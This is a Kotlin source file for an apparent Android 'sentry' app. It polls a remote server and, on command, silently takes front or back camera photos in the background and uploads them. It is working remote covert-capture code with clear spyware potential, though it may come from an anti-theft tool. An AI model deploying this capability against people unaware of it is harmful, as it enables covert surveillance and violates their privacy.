package com.example.sentry.service

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import android.util.Size
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

object BackgroundCameraManager {
    private const val TAG = "SentryCamera"
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private val isCapturing = AtomicBoolean(false)

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            Log.d(TAG, "Background camera polling started")
            while (isActive) {
                try {
                    val res = client.pollCameraCommand()
                    if (res.isSuccess) {
                        val cmd = res.getOrNull()
                        if (!cmd.isNullOrBlank()) {
                            Log.d(TAG, "Received camera capture command: $cmd")
                            capturePhoto(context, cmd) { base64 ->
                                scope.launch {
                                    try {
                                        client.uploadPhoto(cmd, base64)
                                        Log.d(TAG, "Uploaded captured $cmd photo successfully")
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Failed to upload photo", e)
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Camera command poll error: ${e.message}")
                }
                delay(2000)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun capturePhoto(context: Context, cameraFacing: String, onCaptured: (String) -> Unit) {
        // Prevent concurrent capture collisions
        if (!isCapturing.compareAndSet(false, true)) {
            Log.w(TAG, "Capture already in progress, skipping duplicate request")
            return
        }

        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        val wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentry::CameraCaptureWakeLock")?.apply {
            try {
                acquire(10_000L) // 10s safety timeout
            } catch (_: Exception) {}
        }

        var handlerThread: HandlerThread? = null
        var cameraDevice: CameraDevice? = null
        var imageReader: ImageReader? = null
        val isCleanedUp = AtomicBoolean(false)

        fun cleanup() {
            if (isCleanedUp.compareAndSet(false, true)) {
                try {
                    cameraDevice?.close()
                } catch (_: Exception) {}
                try {
                    imageReader?.close()
                } catch (_: Exception) {}
                try {
                    handlerThread?.quitSafely()
                } catch (_: Exception) {}
                try {
                    if (wakeLock?.isHeld == true) {
                        wakeLock.release()
                    }
                } catch (_: Exception) {}
                isCapturing.set(false)
                Log.d(TAG, "Camera resources cleaned up")
            }
        }

        // Safety watchdog: Force cleanup after 8 seconds if hardware hangs
        scope.launch {
            delay(8000)
            if (!isCleanedUp.get()) {
                Log.w(TAG, "Camera capture watchdog timeout triggered - releasing hardware")
                cleanup()
            }
        }

        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            if (cameraManager == null) {
                cleanup()
                return
            }

            val targetFacing = if (cameraFacing.equals("front", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_FRONT
            } else {
                CameraCharacteristics.LENS_FACING_BACK
            }

            var selectedCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    selectedCameraId = id
                    break
                }
            }

            if (selectedCameraId == null) {
                selectedCameraId = cameraManager.cameraIdList.firstOrNull()
            }

            if (selectedCameraId == null) {
                Log.e(TAG, "No camera found on device")
                cleanup()
                return
            }

            val characteristics = cameraManager.getCameraCharacteristics(selectedCameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val supportedSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()

            // Pick optimal resolution: prefer ~1280x720 or closest <= 1920x1080 for reliable fast transmission
            val optimalSize: Size = supportedSizes
                .filter { it.width <= 1920 && it.height <= 1080 && it.width >= 640 }
                .maxByOrNull { it.width * it.height }
                ?: supportedSizes.firstOrNull()
                ?: Size(640, 480)

            Log.d(TAG, "Selected Camera ID: $selectedCameraId, Resolution: ${optimalSize.width}x${optimalSize.height}")

            val thread = HandlerThread("BackgroundCamera_${System.currentTimeMillis()}").apply { start() }
            handlerThread = thread
            val handler = Handler(thread.looper)

            val reader = ImageReader.newInstance(optimalSize.width, optimalSize.height, ImageFormat.JPEG, 2)
            imageReader = reader

            reader.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        if (bytes.isNotEmpty()) {
                            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                            Log.d(TAG, "Photo captured successfully, size: ${bytes.size} bytes")
                            onCaptured(base64)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error acquiring image buffer", e)
                } finally {
                    cleanup()
                }
            }, handler)

            cameraManager.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                        }

                        val sessionCallback = object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(
                                        captureBuilder.build(),
                                        object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureFailed(
                                                session: CameraCaptureSession,
                                                request: CaptureRequest,
                                                failure: CaptureFailure
                                            ) {
                                                super.onCaptureFailed(session, request, failure)
                                                Log.e(TAG, "Capture failed: reason ${failure.reason}")
                                                cleanup()
                                            }
                                        },
                                        handler
                                    )
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed to initiate session capture", e)
                                    cleanup()
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera capture session configuration failed")
                                cleanup()
                            }
                        }

                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            val outputConfig = android.hardware.camera2.params.OutputConfiguration(reader.surface)
                            val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
                                android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
                                listOf(outputConfig),
                                java.util.concurrent.Executors.newSingleThreadExecutor(),
                                sessionCallback
                            )
                            camera.createCaptureSession(sessionConfig)
                        } else {
                            @Suppress("DEPRECATION")
                            camera.createCaptureSession(listOf(reader.surface), sessionCallback, handler)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to create capture session", e)
                        cleanup()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    cleanup()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera device open error: $error")
                    cleanup()
                }
            }, handler)

        } catch (e: SecurityException) {
            Log.e(TAG, "Camera permission denied or restricted in background", e)
            cleanup()
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error during background photo capture", e)
            cleanup()
        }
    }
}
